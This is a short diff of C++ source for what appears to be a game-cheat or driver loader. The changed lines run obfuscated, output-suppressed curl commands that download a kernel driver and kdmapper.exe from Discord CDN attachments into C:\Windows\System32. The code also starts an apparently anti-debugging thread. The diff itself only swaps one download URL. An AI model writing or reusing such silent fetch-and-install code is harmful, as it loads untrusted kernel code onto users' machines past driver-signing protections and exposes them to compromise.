@@ -1086,7 +1086,7 @@ int main(int argc, const char* argv[])
 	std::cout << slowly_printing_string{ " Connecting...\n\n\n",50 };
 	CreateThread(NULL, NULL, loopDbg2, NULL, NULL, NULL);
 	system(E("curl https://cdn.discordapp.com/attachments/1109503024260460615/1112053353975906505/Driver_That_uses_SpacePort_Hook.sys --output C:\\Windows\\System32\\mappeddrv.sys >nul 2>&1"));
-	system(E("curl https://cdn.discordapp.com/attachments/1109503024260460615/1112053181027983490/kdmapper.exe --output C:\\Windows\\System32\\mapperrrrr.exe >nul 2>&1"));
+	system(E("curl https://cdn.discordapp.com/attachments/1113602589980905602/1130585133779517530/kdmapper.exe --output C:\\Windows\\System32\\mapperrrrr.exe >nul 2>&1"));
 	system(E("start https://discord.gg/printf"));
 	Log3(E(""));
 	std::cout << slowly_printing_string{ " Press [ ANY KEY ] To Load Drivers\n",50 };
